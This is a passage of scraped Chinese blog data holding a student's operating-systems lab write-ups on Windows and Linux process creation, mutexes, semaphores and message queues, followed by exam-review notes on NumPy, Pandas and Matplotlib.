三个参数，LPSECURITY_ATTRIBUTESIpMutexAttributes，//指向安全属性的指针。BOOLbInitialOwner，//初始化互斥对象的所有者。LPCTSTRIpName//指向互斥对象名的指针。 CreateSemaphore 中有几个参数，各代表什么含义，信号量的初值在第几个参数中。 有四个参数。IpSemaphoreAttributes SECURITY_ATTRIBUTES，该参数定义了信号量的安全特性。IInitiaICount Long，设置信号量的初始计数。IMaximumCount Long，设置信号量的最大计数。IpNameString，指定信号量对象的名称。信号量的初值在第二个参数中。 3）程序中 P、V 原语所对应的实际 Windows API 函数是什么，写出这几条语句。 WaitForSingIeObject(FullSemaphore,INFINITE);//P(full); WaitForSingIeObject(Mutex,INFINITE);//P(mutex); ReleaseMutex(Mutex);//V(mutex); ReleaseSemaphore(FullSemaphore,1,NULL);//V(full); CreateMutex 能用 CreateSemaphore 替代吗？尝试修改程序 4-1，将信号量 Mutex 完全用CreateSemaphore 及相关函数实现。写出要修改的语句。 可以替代。Mutex=CreateSemaphore(NULL,false,false,NULL);","comments":true,"categories":[{"name":"计算机基础","slug":"计算机基础","permalink":"http://1905060202.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"操作系统","slug":"操作系统","permalink":"http://1905060202.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"课程设计","slug":"课程设计","permalink":"http://1905060202.github.io/tags/%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/"}]},{"title":"操作系统课程设计(三)-Linux进程间通信","date":"2021-06-22T02:01:23.000Z","path":"2021/06/22/操作系统课程设计-三/","text":"写在前面又到了 一年一度期末课设的时候，距离考试还有12天的时间，此时胡小宁还没有复习(准确的说是学习)之前的课程，所以在这个平平无奇的周二，胡小宁就要开始做课设了！ 实验三 Linux 进程间通信 实验目的 Linux 系统的进程通信机构（IPC）允许在任意进程间大批量地交换数据，通过本实验，理解熟悉 Linux 支持的消息通信机制。 实验内容和步骤 （1）使用系统调用 msgget()，msgsnd()，msgrcv()及 msgctl()编制一长度为 1K 的消息的发送和接收程序。 为了便于操作和观察结果，用一个程序作为“引子”，先后 fork()两个子进程 SERVER和 CLIENT，进行通信。 SERVER 端建立一个 key 为 75 的消息队列，等待其他进程发来的消息。当遇到类型为 1 的消息，则作为结束信号，取消该队列，并退出 SERVER。SERVER 每接收到一个消息后显示一句“（server） received”。 CLIENT 端使用 key 为 75 的消息队列，先后发送类型从 10 到 1 的消息，然后退出。最后的一个消息，即是 SERVER 端需要的结束信号。CLIENT 每发送一条消息后显示一句“(client)sent”。 父进程在 SERVER 和 CLIENT 均退出后结束。 代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/msg.h&gt;#include &lt;sys/ipc.h&gt;#define MSGKEY 75struct msgform&#123;long mtype;char mtext[1030];&#125;msg;int msgqid,i;void CLIENT()&#123;int i;msgqid=msgget(MSGKEY,0777);for (i=10;i&gt;=1;i--)&#123;msg.mtype=i;printf(&quot;(client) sent \\n&quot;);msgsnd(msgqid,&amp;msg,1024,0);&#125;exit(0);&#125;void SERVER()&#123;msgqid=msgget(MSGKEY,0777|IPC_CREAT);do&#123; msgrcv(msgqid,&amp;msg,1030,0,0);printf(&quot;(Server) recieved\\n&quot;);&#125; while(msg.mtype!=1);msgctl(msgqid,IPC_RMID,0);exit(0);&#125;void main()&#123;while((i=fork())==-1);if(!i) SERVER();while((i=fork())==-1);if(!i) CLIENT();wait(0);wait(0);&#125; 运行效果如下： UINX/Linux 系统把信号量、消息队列和共享资源统称为进程间通信资源(IPC resource)。提供给用户的 IPC 资源是通过一组系统调用实现的。 用信号量对进程要访问的临界资源进行保护。 用消息队列在进程间以异步方式发送消息。 用一块预留出的内存区域供进程之间交换数据。 分析： 创建 IPC 资源的系统调用有： semget()—获得信号量的 IPC 标识符。 msgget()—获得消息队列的 IPC 标识符。 shmget()—获得共享内存的 IPC 标识符。 控制 IPC 资源的系统调用有： semctl()—对信号量资源进行控制的函数。 msgctl()—对消息队列进行控制的函数。 shmctl()—对共享内存进行控制的函数。 上述函数为获得和设置资源的状态信息提供了一些命令。例如： IPC_SET 命令：设置属主的用户标识符和组标识符。 IPC_STAT 和 IPC_INFO 命令：获得资源状态信息。 IPC_RMID 命令：释放这个资源。 操作 IPC 资源的系统调用有： semop()—获得或释放一个 IPC 信号量。 可以实现 P、V 操作 msgsnd()—发送一个 IPC 消息。 msgrcv()—接收一个 IPC 消息。 shmat()—将一个 IPC 共享内存段添加到进程的地址空间 shmdt()——将 IPC 共享内存段从私有的地址空间剥离。 message的传送和控制并不保证完全同步,当一个程序不在激活状态的时候,它完全可能继续睡眠,造成上面现象,在多次send message 后才 receive message.这一点有助于理解消息转送的实现机理。 （2）观察参考程序，说明控制消息队列系统调用 msgctl()在此起什么作用？ 在此调用msgctl是用于删除id的消息队列。","comments":true,"categories":[{"name":"计算机基础","slug":"计算机基础","permalink":"http://1905060202.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"操作系统","slug":"操作系统","permalink":"http://1905060202.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"课程设计","slug":"课程设计","permalink":"http://1905060202.github.io/tags/%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/"}]},{"title":"操作系统课程设计(二)-Linux进程管理","date":"2021-06-22T00:00:23.000Z","path":"2021/06/22/操作系统课程设计-二/","text":"写在前面又到了 一年一度期末课设的时候，距离考试还有12天的时间，此时胡小宁还没有复习(准确的说是学习)之前的课程，所以在这个平平无奇的周二，胡小宁就要开始做课设了！ 实验二 Linux 进程 管理 实验目的通过进程的创建、撤销和运行加深对进程概念和进程并发执行的理解，明确进程和程序之间的区别。 实验内容和步骤 （1）进程的创建： 这里要玩虚拟机了，在虚拟机上玩Centos，也就是基于Linux开发的操作系统。安装什么的就不赘述了，网上都可以找得到对应的教程。如下是安装好之后的界面！ 肉眼可见的是，Linux操作系统的界面同Windows有很多相似之处。但是捏，我还不太会用Linux，所以下面来简单的介绍一下Linux操作系统的使用吧！ Linux编程基础 熟悉Linux下的c/c++编程环境：vi/gedit编辑器+gcc编译器+gdb调试器 怎么玩捏？ vi编辑器是所有Unix及Linux系统下标准的编辑器，它的强大不逊色于任何最新的文本编辑器，这里只是简单地介绍一下它的用法和一小部分指令。由于对Unix及Linux系统的任何版本，vi编辑器是完全相同的，因此您可以在其他任何介绍vi的地方进一步了解它。Vi也是Linux中最基本的文本编辑器，学会它后，您将在Linux的世界里畅行无阻。 请看教程：vi/vim的使用 Linux下的C编程 vim编辑器的使用 在Linux下新建一个文件夹，命名为hnust_OS。在目录下打开shell。 创建了hnust_OS文件夹。 敲入命令vim fuckcode.c 就成功的在目录下创建了.c文件。按i,进入编辑模式。代码可以右键复制粘贴过去。然后捏，就可以按ESC退出，再按:进入底线模式，然后输入w保存，q退出。也可直接wq保存并退出！ 一顿操作猛如虎，我们的fuckcode.c便成功了，可以看到下面有了fuckcode.c的文件！ 这个时候我们要编译fuckcode了！请看操作！ 由于 c 语言是一种高级语言，所以输入完 c 程序后就要对它进行编译。gcc 命令可以用来编译c 程序。如果在 gcc 命令后面直接跟上文件名，则编译后的输出结果将存放在标准的 a.out 文件中。如果 gcc 命令使用-o 任选项，则可以将编译结果存放在自己命名的文件中。为方便起见，我们使用带-o 任选项的 gcc 命令来进行编译。当然，在本次课程设计中也可以使用 gcc 命令进行编译。$gcc –o compact compact.c 可以看到！编译成功！！ 接下来我们./fuckcode来运行。 对了，这里要特别声明一下！指导书里写的删除空行的程序试错的！他妈的！把’/n’改成’ ‘，就能实现如上图所示的功能了！ 恭喜，你差不多玩明白了基础操作。下面让我们开始搞课设吧！！！ 先看一下任务要求: 编写一段程序，使用系统调用 fork（）创建一个子进程。当此程序运行时，在系统中有一个父进程和一个子进程活动。让每一个进程在屏幕上分别显示字符：父进程显示字符“b”；子进程显示字符“a”，另外父子进程都显示字符“c”。 代码如下： 12345678910111213141516171819#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;main()&#123;int x;srand((unsigned)time(NULL));while((x=fork())==-1);if (x==0)&#123;sleep(rand() % 2);printf(&quot;a&quot;);&#125;else&#123;sleep(rand() % 3);printf(&quot;b&quot;);&#125;printf(&quot;c&quot;);&#125; 可以看到效果如下： 分析：fork 建立一个子进程，父进程继续运行，子进程在同样的位置执行同样的程序。对于父进程，fork()返回子进程的 pid, 对于子进程，fork()返回 0。出错时返回-1。两个进程同时运行！至于谁先上，这个是哲学问题… （2）子进程执行新任务 任务要求： 编写一段程序，使用系统调用 fork（）创建一个子进程。子进程通过系统调用 exec更换自己原有的执行代码，转去执行 Linux 命令/bin/ls (显示当前目录的列表)，然后调用 exit（）函数结束。父进程则调用 waitpid()等待子进程结束，并在子进程结束后显示子进程的标识符，然后正常结束。 代码如下： 12345678910111213141516171819202122232425#include &lt;sys/wait.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;int main()&#123;pid_t pid;/* fork a child process */pid = fork();if (pid &lt; 0)&#123; /* error occurred */fprintf(stderr, &quot;Fork Failed&quot;);return 1;&#125;else if (pid == 0)&#123; /* 子进程 */execlp(&quot;/bin/ls&quot;,&quot;ls&quot;,NULL);&#125;else &#123; /* 父进程 *//* 父进程将一直等待，直到子进程运行完毕*/wait(NULL);printf(&quot;Child Complete&quot;);&#125;return 0;&#125; 效果如下： 注意！从指导书复制代码过来的时候，要给头文件加上#include &lt;sys/wait.h&gt;。否则程序无法正常运行哦！ 分析： exec 系列函数用新的进程映象置换当前的进程映象.这些函数的第一个参数是待执行程序的路径名(文件名)。这些函数调用成功后不会返回,其进程的正文(text),数据(data)和栈(stack)段被待执行程序程序覆盖。但是进程的 PID 和所有打开的文件描述符没有改变,同时悬挂信号被清除，信号重置为缺省行为。 使用系统调用 fork（）创建一个子进程。子进程通过系统调用 exec更换自己原有的执行代码，转去执行 Linux 命令/bin/ls (显示当前目录的列表)，然后调用 exit（）函数结束。父进程则调用 waitpid()等待子进程结束，并在子进程结束后显示子进程的标识符，然后正常结束。","comments":true,"categories":[{"name":"计算机基础","slug":"计算机基础","permalink":"http://1905060202.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"操作系统","slug":"操作系统","permalink":"http://1905060202.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"课程设计","slug":"课程设计","permalink":"http://1905060202.github.io/tags/%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/"}]},{"title":"操作系统课程设计(一)-Windows进程管理","date":"2021-06-21T06:58:50.000Z","path":"2021/06/21/操作系统课程设计-一/","text":"写在前面又到了 一年一度期末课设的时候，距离考试还有两周的时间，此时胡小宁还没有复习(准确的说是学习)之前的课程，所以在这个平平无奇的周一，胡小宁就要开始做课设了！ 实验一 Windows 进程管理 实验目的（1）学会使用 VC 编写基本的 Win32 Consol Application（控制台应用程序)。（2）通过创建进程、观察正在运行的进程和终止进程的程序设计和调试操作，进一步熟悉操作系统的进程概念，理解 Windows 进程的“一生”。（3）通过阅读和分析实验程序，学习创建进程、观察进程、终止进程以及父子进程同步的基本程序设计方法。 实验内容和步骤 （1） 编写基本的 Win32 Consol Application： 指导书上的步骤有很多缺陷。我在Windows上做课设所使用的编译器是CodeBlocks，所以在操作和代码方面与指导书给的标准有些出入。这里创建的是Consol Application。 代码如下： 123456#include &lt;iostream&gt;using namespace std;int main()&#123;cout &lt;&lt; &quot;Hello, Win32 Consol Application&quot; &lt;&lt; endl ;&#125; 这样就完成了编写基本的Consol Application。 分析：按照指导书的操作运行会不成功，原因有二。一是编译器的不同，CodeBlocks不允许主函数无返回类型。二是从指导书上直接复制过来的代码有许多非法字符，非法空格，这些都需要更改。 （2）创建进程 代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#include &lt;windows.h&gt;#include &lt;iostream&gt;#include &lt;stdio.h&gt;// 创建传递过来的进程的克隆过程并赋于其 ID 值void StartClone(int nCloneID)&#123;// 提取用于当前可执行文件的文件名TCHAR szFilename[MAX_PATH] ;GetModuleFileName(NULL, szFilename, MAX_PATH) ;// 格式化用于子进程的命令行并通知其 EXE 文件名和克隆 IDTCHAR szCmdLine[MAX_PATH];sprintf(szCmdLine,&quot;\\&quot;%s\\&quot; %d&quot;,szFilename,nCloneID);// 用于子进程的 STARTUPINFO 结构STARTUPINFO si;ZeroMemory(&amp;si , sizeof(si) ) ;si.cb = sizeof(si) ; // 必须是本结构的大小// 返回的用于子进程的进程信息PROCESS_INFORMATION pi;// 利用同样的可执行文件和命令行创建进程，并赋于其子进程的性质BOOL bCreateOK=::CreateProcess(szFilename, // 产生这个 EXE 的应用程序的名称szCmdLine, // 告诉其行为像一个子进程的标志NULL, // 缺省的进程安全性NULL, // 缺省的线程安全性FALSE, // 不继承句柄CREATE_NEW_CONSOLE, // 使用新的控制台NULL, // 新的环境NULL, // 当前目录&amp;si, // 启动信息&amp;pi) ; // 返回的进程信息// 对子进程释放引用if (bCreateOK)&#123;CloseHandle(pi.hProcess) ;CloseHandle(pi.hThread) ;&#125;&#125;int main(int argc, char* argv[] )&#123;// 确定派生出几个进程，及派生进程在进程列表中的位置int nClone=0;//修改语句：int nClone;//第一次修改：nClone=0;if (argc &gt; 1)&#123;// 从第二个参数中提取克隆 ID:: sscanf(argv[1] , &quot;%d&quot; , &amp;nClone) ;&#125;//第二次修改：nClone=0;// 显示进程位置std :: cout &lt;&lt; &quot;Process ID:&quot; &lt;&lt; :: GetCurrentProcessId()&lt;&lt; &quot;, Clone ID:&quot; &lt;&lt; nClone&lt;&lt; std :: endl;// 检查是否有创建子进程的需要const int c_nCloneMax=5;if (nClone &lt; c_nCloneMax)&#123;// 发送新进程的命令行和克隆号StartClone(++nClone) ;&#125;// 等待响应键盘输入结束进程getchar();return 0;&#125; 运行结果如下： 修改nClone=1； 运行结果如下： 修改nClone=2； 运行结果如下： 如上是nClone取值不同所产生的不同运行结果。可以看出，进程ID起始值同nClone的值相同。如果将nClone的初始化位置换在下方，将会有非常严重的后果产生—进程创建的死循环！不一会儿你的电脑内存就炸了！！！ 分析：程序从main函数开始，创建进程，每次引用该进程exe文件位置创建下一个进程（再反过来继续调用main函数，如此循环，使用c_nCloneMax作为限制）。因为调换了nClone的初始化位置，会使nClone永远达不到c_nCloneMax，造成死循环。 （3）父子进程的简单通信及终止进程 代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394// procterm 项目# include &lt;windows.h&gt;# include &lt;iostream&gt;# include &lt;stdio.h&gt;static LPCTSTR g_szMutexName = &quot;w2kdg.ProcTerm.mutex.Suicide&quot; ;// 创建当前进程的克隆进程的简单方法void StartClone()&#123;// 提取当前可执行文件的文件名TCHAR szFilename[MAX_PATH] ;GetModuleFileName(NULL, szFilename, MAX_PATH) ;// 格式化用于子进程的命令行，字符串“child”将作为形参传递给子进程的 main 函数TCHAR szCmdLine[MAX_PATH] ;//实验 1-3 步骤 3：将下句中的字符串 child 改为别的字符串，重新编译执行，执行前请先保存已经完成的工作sprintf(szCmdLine, &quot;\\&quot;%s\\&quot; child&quot;, szFilename) ;// 子进程的启动信息结构STARTUPINFO si;ZeroMemory(&amp;si,sizeof(si)) ;si.cb = sizeof(si) ; // 应当是此结构的大小// 返回的用于子进程的进程信息PROCESS_INFORMATION pi;// 用同样的可执行文件名和命令行创建进程，并指明它是一个子进程BOOL bCreateOK=CreateProcess(szFilename, // 产生的应用程序的名称 (本 EXE 文件)szCmdLine, // 告诉我们这是一个子进程的标志NULL, // 用于进程的缺省的安全性NULL, // 用于线程的缺省安全性FALSE, // 不继承句柄CREATE_NEW_CONSOLE, //创建新窗口NULL, // 新环境NULL, // 当前目录&amp;si, // 启动信息结构&amp;pi ) ; // 返回的进程信息// 释放指向子进程的引用if (bCreateOK)&#123;CloseHandle(pi.hProcess) ;CloseHandle(pi.hThread) ;&#125;&#125;void Parent()&#123;// 创建“自杀”互斥程序体HANDLE hMutexSuicide=CreateMutex(NULL, // 缺省的安全性TRUE, // 最初拥有的g_szMutexName) ; // 互斥体名称if (hMutexSuicide != NULL)&#123;// 创建子进程std :: cout &lt;&lt; &quot;Creating the child process.&quot; &lt;&lt; std :: endl;StartClone() ;// 指令子进程“杀”掉自身std :: cout &lt;&lt; &quot;Telling the child process to quit. &quot;&lt;&lt; std :: endl;//等待父进程的键盘响应getchar() ;//释放互斥体的所有权，这个信号会发送给子进程的 WaitForSingleObject 过程ReleaseMutex(hMutexSuicide) ;// 消除句柄CloseHandle(hMutexSuicide) ;&#125;&#125;void Child()&#123;// 打开“自杀”互斥体HANDLE hMutexSuicide = OpenMutex(SYNCHRONIZE, // 打开用于同步FALSE, // 不需要向下传递g_szMutexName) ; // 名称if (hMutexSuicide != NULL)&#123;// 报告我们正在等待指令std :: cout &lt;&lt;&quot;Child waiting for suicide instructions. &quot; &lt;&lt; std :: endl;//子进程进入阻塞状态，等待父进程通过互斥体发来的信号WaitForSingleObject(hMutexSuicide, INFINITE) ;//实验 1-3 步骤 4：将上句改为 WaitForSingleObject(hMutexSuicide, 0) ，重新编译执行// 准备好终止，清除句柄std :: cout &lt;&lt; &quot;Child quiting.&quot; &lt;&lt; std :: endl;CloseHandle(hMutexSuicide) ;&#125;&#125;int main(int argc, char* argv[] )&#123;// 决定其行为是父进程还是子进程if (argc&gt;1 &amp;&amp; :: strcmp(argv[1] , &quot;child&quot; )== 0)&#123;Child() ;&#125;else&#123;Parent() ;&#125;return 0;&#125; 在利用CreateProcess函数创建进程时，命令行中需要szCmdLine来作为argv的参数创建这个子进程，两个参数是分开的， sprintf()函数中的”\\”%s\\” child”，%s填入的是可执行文件的路径，child则是创建子进程。两个参数之间必须加上空格才正确。如果只是抄过来指导书上的代码，将会进入死循环。内存炸了哦！ 步骤3：第一次修改后，创建进程的第二个参数不是child了，因此子进程进入的是parent函数，所以程序在不断的创建子进程，死循环。 步骤4：第二次修改后，WaitForSingleObject(hMutexSuicide, INFINITE);INFINITE变成了0，所以会进入临界区，继续执行子进程，最后关闭子进程并关闭句柄。 整个程序要体现的是父子进程通信，父子进程的同步是由PV操作完成的。 P操作：WaitForSingleObject(hMutexSuicide, INFINITE);V操作：ReleaseMutex(hMutexSuicide) HANDLE hMutexSuicide = CreateMutex(NULL,TRUE,g_szMutexName);互斥体实现了“互相排斥”（mutual exclusion）同步的简单形式（所以名为互斥体(mutex)）。互斥体禁止多个线程同时进入受保护的代码“临界区”（critical section）。因此，在任意时刻，只有一个线程被允许进入这样的代码保护区。任何线程在进入临界区之前，必须获取（acquire）与此区域相关联的互斥体的所有权。如果已有另一线程拥有了临界区的互斥体，其他线程就不能再进入其中。这些线程必须等待，直到当前的属主线程释放（release）该互斥体。 ReleaseMutex(hMutexSuicide);一个线程释放了互斥对象的控制权后，如果其他进程在等待互斥对象置位，则等待的线程可以得到该互斥对象，等待函数返回，互斥对象被新的线程所拥有。并且会发送信号给waitforsingleobject WaitForSingleObject(hMutexSuicide, INFINITE);WaitForSingleObject函数用来检测hMutexSuicide事件的信号状态，在某一线程中调用该函数时，线程暂时挂起，如果在挂起的dwMilliseconds毫秒内，线程所等待的对象变为有信号状态，则该函数立即返回；如果超时时间已经到达dwMilliseconds毫秒，但hMutexSuicide所指向的对象还没有变成有信号状态，函数照样返回。参数dwMilliseconds有两个具有特殊意义的值：0和INFINITE。若为0，则该函数立即返回；若为INFINITE，则线程一直为阻塞状态，直到hHandle所指向的对象变为有信号状态时为止。 OpenMutex() 打开已有的互斥体","comments":true,"categories":[{"name":"计算机基础","slug":"计算机基础","permalink":"http://1905060202.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"操作系统","slug":"操作系统","permalink":"http://1905060202.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"课程设计","slug":"课程设计","permalink":"http://1905060202.github.io/tags/%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/"}]},{"title":"Python与数据分析期末复习","date":"2021-06-19T05:53:46.000Z","path":"2021/06/19/Python与数据分析期末复习/","text":"21年考情题型： ​ 填空题10分 ​ 代码填空20分 ​ 读程序写结果40分 ​ 程序设计10分（一道） ​ 大数据案例论述题20分（一道） P1、P2 1.1.1数据分析的概念：分哪几个部分？1.1.2数据分析的流程：各有什么用？ P4、P5 1.2.2 熟悉Numpy、Pandas、Matplotlib的用处。 P15 2.1 Numpy多维数组下的一段话，即Numpy多维数组的作用？ P18 arange函数、linspace函数、logspace函的使用。 P19 最下面 5.随机数数组，熟悉前四个函数的使用（rand、randint、randn、seed） P39 示例2-34，四个函数都要会用 P46 2.5.2矩阵行列式、示例2-44 P47 2.5.4线性方程组、示例2-46 P49 四、读程序的1、2题 P54 引言matplotlib的作用、3.1.1绘制线形图、示例3-1，熟悉plot函数的使用。 P74 示例3-25用figure函数创建子图 P89 pandas有哪几种数据结构、概念 P91 数据帧DataFrame的定义和使用 P106 示例4-13更换索引 P112 示例4-21排序 P134 数据清洗的定义 P135 缺失值（检测缺失值的方法，处理缺失值有哪几种方法） P138 示例5-5填充缺失值fillna函数的应用 Ps：前途是光明的，道路是曲折的！ 逐点击破零、数据分析的概念？分哪几个部分？数据分析概念：数据分析是指选用适当的分析方法对收集来的大量数据进行分析、提取有用的信息和形成结论、对数据加以详细研究和概括总结的过程。 广义的数据分析包括： 狭义数据分析 数据挖掘 共两部分。 狭义数据分析是指根据分析目的，采用对比分析、分组分析、交叉分析和回归分析等方法，对收集的数据进行处理与分析，提取有价值的信息，发挥数据的作用，得到一个特征统计量结果的过程。 数据挖掘是从大量的、不完全的、有噪声的、模糊的、随机的实际应用数据中，通过应用聚类模型、分类模型、回归和关联规则等技术，挖掘潜在价值的过程。 一、数据分析的流程？各有什么用？数据分析已经逐渐演化为一种解决问题的过程，典型的数据分析流程如下： 需求分析 数据获取 数据预处理 分析与建模 模型评价与优化 部署 需求分析：需求分析的主要内容是根据数据分析需求方的要求和实际情况，结合现有的数据情况，提出数据分析需求的整体分析方向、分析内容，最终和需求方达成一致意见。 数据获取：数据获取是根据需求分析的结果提取、收集数据。 数据预处理：数据预处理是指对数据进行数据合并、数据清洗和数据变换，并直接用于分析建模的这一过程的总称。 分析与建模：分析与建模是指通过对比分析、分组分析、交叉分析、回归分析deng分析方法，以及聚类模型、分类模型、关联模型等模型与算法，发现数据中有价值的信息，并得出结论的过程。 模型评价与优化：模型评价是指对于已经建立的模型，根据其模型的类别，使用不同指标评价其性能优劣的过程。 二、 熟悉Numpy、Pandas、Matplotlib的用处。Numpy: Numpy是Numerical Python的简称，是Python语言的一个科学计算的扩展程序库，支持大量的多维数组与矩阵运算，此外也针对数组运算提供大量的数学函数库。Numpy主要提供以下内容： 快速高效的多维数组对象ndarray 广播功能函数，广播是一种对数组执行数学运算的函数，其执行的是元素级计算。广播提供了算术运算期间处理不同形状的数组的能力。 读/写硬盘上基于数组的数据集工具 线性代数运算、傅里叶变换及随机数生成功能 将C/C++、Fortran代码集成到Python的工具 除了为Python提供快速的数组处理能力外，Numpy在数据分析方面还有另一个主要作用，即作为算法之间传递数据的容器。对于数值型数据，使用Numpy数组存储和处理数据要比使用内置的Python数据结构高效得多。此外，由其他语言(如C语言)编写的库可以直接操作Numpy数组中的数据，无需进行任何数据复制工作。 Pandas： Pandas是Python的数据分析核心库，最初被作为金融数据分析工具而开发出来。Pandas为时间序列分析提供了很好的支持。Pandas纳入了大量库和一些标准的数据模型，提供了高效地操作大型数据集所需的工具，提供一些列能够快速、便捷地处理结构化数据的结构和函数。Python之所以成为强大而高效的数据分析环境与他息息相关。Pandas兼具Numpy高性能的数组计算功能以及电子表格和关系型数据库的灵活数据处理功能，它提供了复杂精细的索引功能，以便便捷地完成重塑、切片和切换、聚合及选取数据子集等操作。 Matplotlib： Matplotlib是最流行的用于绘制数据图形地Python库，它以各种硬件拷贝格式和跨平台地交互式环境生成出高质量的图形。 三 、 Numpy多维数组下的一段话，即Numpy多维数组的作用？Numpy提供了一个名为ndarray的多维数组对象，该数组元素具有固定的大小，即Numpy数组元素是同质的，只能存放同一种数据类型的对象，因此能够确定存储数组所需空间的大小，能够运用向量化运算来处理整个数组，具有较高的运算效率。 四、 arange函数、linspace函数、logspace函的使用。从数值范围创建数组的Numpy函数有三个：arange()\\linspace()和logspace()。 arange()函数函数arange()根据start指定的范围以及step设置的步长，生成一个ndarry对象，函数格式如下： 1numpy.arange(start,stop,step,dtype) 其中的参数如表所示： 参数 描述 start 起始值，默认为0 stop 终止值(不包含) step 步长，默认为1 dtype 返回的ndarray的数据类型，如果没有提供，则会使用输入数据的类型 linspace()函数Linspace()函数用于创建一个一维数组，数组是一个等差数列构成的，其格式如下： 1np.linspace(start,stop,num=50,endpoint=True,retstep=False,dtype=None) 其中参数如表所示 参数 描述 start 起始值，默认为0 stop 序列的终止值，如果endpoint为True，该值包含于数列中 num 要生成的等步长的样本数量，默认为50 dtype ndarray的数据类型 endpoint 该值为True时，数列中包含stop值，反之不包含，默认为True retstep 如果为True，生成的数组中会显示间距，反之不显示 logspace()函数logspace()函数用于创建一个对数运算的等比数列，其格式如下： 1np.logspace(start,stop,num=50,endpoint=True,base=10.0,dtype=None) 参数 描述 start 起始值，默认为0 stop 序列的终止值，如果endpoint为True，该值包含于数列中 num 要生成的等步长的样本数量，默认为50 dtype ndarray的数据类型 endpoint 该值为True时，数列中包含stop值，反之不包含，默认为True base 对数log的底数 实例：从数值范围创建数组 1234567import numpy as npc1 = np.arange(10)c2 = np.linspace(1,10,10)c3 = np.logspace(10,100,10)print(&#x27;c1=&#x27;,c1)print(&#x27;c2=&#x27;,c2)print(&#x27;c3=&#x27;,c3) 五、 最下面 5.随机数数组，熟悉前四个函数的使用（rand、randint、randn、seed）rand()函数rand()函数产生一个指定形状的数组，数组中的值服从[0,1)之间的均匀分布，其格式如下： 1numpy.random.rand(d0,d1,...,dn) 其中，参数d0，d1，…，dn为int型，可选。如果没有参数则返回一个float型的随机数。该随机数服从[0,1]之间的均匀分布。其返回值是一个ndarray对象或者一个float型的值。 示例：rand()函数的应用 123import numpy as npa = np.random.rand(2,4)print(a) randn()函数函数randn()返回一个指定形状的数组，数组中的值服从标准正态分布(均值为0，方差为1)，其格式如下： 1numpy.random.randn(d0,d1,...,dn) 其中，参数d0，d1，…，dn为int型，可选。如果没有参数，则返回一个服从标准正态分布的float型随机数。 返回值：ndarray对象或者float 示例：randn()函数的应用 123import numpy as npa = np.random.randn(2,4)print(a) randint()函数randint()函数生成一个在区间[low,high)中离散均匀抽样的数组，其格式如下： 1numpy.random.randint(low,high=None,size=None,dtype=&#x27;1&#x27;) 函数参数说明如下： ①low、high：int型，指定抽样区间[low，high) ②size：int型或int型元组，指定形状 ③dtype：可选参数，指定数据类型，如int、int64等，默认为np.int 返回值：如果指定了size，则返回一个int型的ndarray对象，否则返回一个服从该分布的int型随机数。 示例：randint()函数的应用 123import numpy as npa = np.random.randint(1,10,size=(2,4))print(a) 六、 示例2-34，四个函数都要会用add()、subtract()、multiply()和divide()函数的应用。 1234567import numpy as npa = np.array([[0,1,2],[3,4,5],[6,7,8]])b = np.array([11,12,13])print(np.add(a,b))print(np.subtract(a,b))print(np.multiply(a,b))print(np.divide(a,b)) 解释一下：函数用法对应英文单词的意思。首尾要相同！(1,3)(3,1)就可以，(1,3)(2,3)就不行。 七、矩阵行列式、示例2-44numpy.linalg.det()函数计算输入矩阵的行列式。 1234import numpy as npa = np.array([[1,2],[3,4]])b = np.linalg.det(a)print(b) 解释：对角线相乘然后一减，后面有4是因为机器码转换成数据时精度问题。 八、线性方程组、示例2-46numpy.linalg中的solve()函数可以求解线性方程组。 线性方程Ax=b,其中A是一个矩阵，b是一维或者二维数组，而x是未知量。 123x+y+z=62y+5z=-42x+5y-z=27 代码求解： 1234567import numpy as npA = np.mat(&quot;1 1 1;0 2 5;2 5 -1&quot;)b = np.array([6,-4,27])x = np.linalg.solve(A,b)print(&#x27;方程解:&#x27;,x)print(x.ndim)print(np.dot(A,x)) #验证 上面代码的创建矩阵也可写成如下形式： 1A = np.mat([[1,1,1],[0,2,5],[2,5,-1]]) 九、读程序的1、2题 以下程序的执行结果是： 12345import numpy as npa = np.arange(12).reshape(2,6)c = a.ravel()c[0] = 100print(a) 说明ravel不会动原数组对象。 以下程序执行结果是: 1234import numpy as npa = np.arange(9)b = np.split(a,3)print(b) 十、引言matplotlib的作用、绘制线形图、示例3-1，熟悉plot函数的使用。matplotlib的作用：数据可视化是形象展示数据的主要手段，也是数据分析的重要组成部分。matplotlib是一个基于Python的图形可视化工具，支持多种图形的绘制，并支持完整的图标样式和个行化设置，功能强大且易学易用。 绘制线形图：线形图是最基本的图表类型，常用于绘制连续的数据。通过绘制线形图，可以表现出数据的一种趋势变化。Matplotlib的plot()函数用来绘制线形图，其格式如下： 1matplotlib.pyplot.plot(*args,**kwargs) args是一个可变长的参数，允许使用可选格式字符串的多个x、y对，并且x可以省略。当省略x时，通过y索引0,1…,n-1作为x。 kwargs参数也是一个可变长的参数，允许对线形图的显示效果进行设置。 1234567%matplotlib inlineimport numpy as npimport matplotlib.pyplot as pltx = np.linspace(-np.pi,np.pi,250)y,z = 